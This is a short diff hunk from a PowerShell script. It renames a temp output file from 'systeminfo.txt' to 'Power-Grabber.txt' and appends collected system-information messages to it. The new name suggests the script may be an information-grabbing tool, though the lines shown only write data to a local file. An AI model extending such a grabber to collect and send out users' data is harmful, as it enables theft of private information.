@@ -493,7 +493,7 @@ $process
 
 =================================================================================================================================="
 
-$outpath = "$env:TEMP/systeminfo.txt"
+$outpath = "$env:TEMP/Power-Grabber.txt"
 $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
 $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
 $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
